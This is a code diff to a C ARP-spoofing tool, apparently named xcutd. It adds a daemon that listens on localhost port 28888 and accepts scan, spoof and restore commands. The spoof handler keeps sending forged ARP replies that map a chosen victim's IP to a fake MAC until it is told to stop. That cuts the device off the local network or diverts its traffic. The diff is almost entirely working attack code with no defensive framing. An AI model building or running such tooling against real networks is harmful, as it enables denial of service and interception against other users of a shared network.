@@ -11,6 +11,7 @@
 #include <linux/if_packet.h>
 #include <net/if.h>
 #include <netinet/in.h>
+#include <poll.h>
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -229,11 +230,148 @@ static int cmd_restore(const char *ifname, int ifindex, const char *victim,
     return 0;
 }
 
+/* ---------------- daemon mode (persistent, TCP 127.0.0.1:28888) ---------------- */
+
+#define XCTD_PORT 28888
+
+static int read_line(int fd, char *buf, size_t len) {
+    size_t i = 0;
+    while (i < len - 1) {
+        char c;
+        ssize_t n = read(fd, &c, 1);
+        if (n <= 0) return -1;
+        if (c == '\n') break;
+        buf[i++] = c;
+    }
+    buf[i] = 0;
+    return (int)i;
+}
+
+static unsigned char *victim_ip_tmp(const char *victim) {
+    static unsigned char v[4];
+    parse_ip(victim, v);
+    return v;
+}
+
+static int daemon_handle_client(int fd, const char *ifname, int ifindex) {
+    char line[512];
+    for (;;) {
+        struct pollfd p = {fd, POLLIN, 0};
+        int pr = poll(&p, 1, 2000);
+        if (pr < 0) break;
+        if (pr == 0) continue;
+        int n = read_line(fd, line, sizeof(line));
+        if (n < 0) break;
+        if (strcmp(line, "quit") == 0) break;
+
+        if (strcmp(line, "ping") == 0) {
+            write(fd, "PONG\n", 5);
+            continue;
+        }
+        if (strncmp(line, "scan", 4) == 0) {
+            /* scan: run the burst, then drain replies briefly */
+            cmd_scan(ifname, ifindex);
+            write(fd, "OK\n", 3);
+            continue;
+        }
+        if (strncmp(line, "spoof ", 6) == 0) {
+            char victim[64] = {0}, mac[32] = {0};
+            sscanf(line + 6, "%63s %31s", victim, mac);
+            if (!victim[0]) { write(fd, "ERR\n", 4); continue; }
+            /* spoof until 'stop' or disconnect */
+            unsigned char ip[4], mac6[6];
+            unsigned char fake[6] = {0, 0, 0, 0, 0, 0};
+            if (mac[0] && sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                                 &fake[0], &fake[1], &fake[2], &fake[3], &fake[4], &fake[5]) != 6) {
+                write(fd, "ERR\n", 4);
+                continue;
+            }
+            if (get_ipv4(ifname, ip) < 0 || get_mac(ifindex, ifname, mac6) < 0 ||
+                parse_ip(victim, victim_ip_tmp(victim)) < 0) {
+                write(fd, "ERR\n", 4);
+                continue;
+            }
+            (void)mac6;
+            write(fd, "OK\n", 3);
+            for (;;) {
+                send_arp(ARPOP_REPLY, fake, victim_ip_tmp(victim), NULL,
+                         victim_ip_tmp(victim), ifindex);
+                struct pollfd p2 = {fd, POLLIN, 0};
+                if (poll(&p2, 1, 2000) > 0) {
+                    char stop[64];
+                    if (read_line(fd, stop, sizeof(stop)) < 0) return 0;
+                    if (strcmp(stop, "stop") == 0) { write(fd, "STOPPED\n", 8); break; }
+                }
+            }
+            continue;
+        }
+        if (strncmp(line, "restore ", 8) == 0) {
+            char victim[64] = {0}, mac[32] = {0};
+            sscanf(line + 8, "%63s %31s", victim, mac);
+            if (!victim[0] || !mac[0]) { write(fd, "ERR\n", 4); continue; }
+            cmd_restore(ifname, ifindex, victim, mac);
+            write(fd, "OK\n", 3);
+            continue;
+        }
+        write(fd, "ERR unknown\n", 12);
+    }
+    return 0;
+}
+
+static int cmd_daemon(const char *ifname, int ifindex) {
+    int ls = socket(AF_INET, SOCK_STREAM, 0);
+    if (ls < 0) {
+        fprintf(stderr, "socket: %s\n", strerror(errno));
+        return 1;
+    }
+    int one = 1;
+    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_port = htons(XCTD_PORT);
+    if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        fprintf(stderr, "bind: %s\n", strerror(errno));
+        return 1;
+    }
+    if (listen(ls, 2) < 0) {
+        fprintf(stderr, "listen: %s\n", strerror(errno));
+        return 1;
+    }
+    fprintf(stderr, "xcutd listening on 127.0.0.1:%d (raw socket ready)\n", XCTD_PORT);
+    for (;;) {
+        int fd = accept(ls, NULL, NULL);
+        if (fd < 0) {
+            if (errno == EINTR) continue;
+            break;
+        }
+        daemon_handle_client(fd, ifname, ifindex);
+        close(fd);
+    }
+    close(ls);
+    return 0;
+}
+
 int main(int argc, char **argv) {
     signal(SIGTERM, on_signal);
     signal(SIGINT, on_signal);
+    if (argc >= 2 && strcmp(argv[1], "--daemon") == 0) {
+        const char *ifname = getenv("ARP_IFACE");
+        if (!ifname) ifname = "wlan0";
+        int ifindex = open_raw(ifname);
+        if (ifindex < 0) {
+            ifname = "wlan1";
+            ifindex = open_raw(ifname);
+            if (ifindex < 0) {
+                fprintf(stderr, "no usable iface\n");
+                return 1;
+            }
+        }
+        return cmd_daemon(ifname, ifindex);
+    }
     if (argc < 2) {
-        fprintf(stderr, "usage: arp scan|spoof <ip> [mac]|restore <ip> <mac>\n");
+        fprintf(stderr, "usage: arp scan|spoof <ip> [mac]|restore <ip> <mac> | --daemon\n");
         return 2;
     }
     const char *ifname = getenv("ARP_IFACE");
@@ -249,6 +387,6 @@ int main(int argc, char **argv) {
         return cmd_spoof(ifname, ifindex, argv[2], argc >= 4 ? argv[3] : NULL);
     if (strcmp(argv[1], "restore") == 0 && argc >= 4)
         return cmd_restore(ifname, ifindex, argv[2], argv[3]);
-    fprintf(stderr, "usage: arp scan|spoof <ip> [mac]|restore <ip> <mac>\n");
+    fprintf(stderr, "usage: arp scan|spoof <ip> [mac]|restore <ip> <mac> | --daemon\n");
     return 2;
 }
